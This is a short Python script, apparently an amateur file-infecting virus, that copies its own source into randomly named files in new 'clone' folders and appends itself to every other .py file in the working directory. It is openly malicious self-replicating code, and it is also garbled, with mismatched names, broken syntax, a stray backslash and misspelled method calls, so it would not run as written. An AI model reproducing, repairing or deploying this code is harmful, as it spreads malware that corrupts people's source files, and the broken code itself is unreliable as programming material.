import os
import random
#replicates theis script in another folder
File = open(__file__,'r')
Data = File.read()
File.Close()

def Randoomiser():
    name = ''
	chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
	Length = random.randint(1,11)
	for i in range(length):
		\ += random.choice(chars)
	return name

def Recreate(Fi_Name,Folder):
	try:
		os.mkdir(folder)
		os.chdir(folder)
		file = open(Fi_Name, + '.py' 'w')
		File.write(Data)
		File.close
		os.chdir("..")
		
	except Exception as Error:
		Folder = Folder + "0"
		Recreate(Fi_Name,Folder)

for i in range(5):
Name = Randomiser()
recreate (Name,"clone")

Files = list()
for file in os.listdir();
	if file.endswith('.py'):
		Files.append(file)
Files.remove(__file__)

# Injects this code into other files
for File in Files:
	Object = open(File,'a')
	Object.write(Data)
	Object.colse()
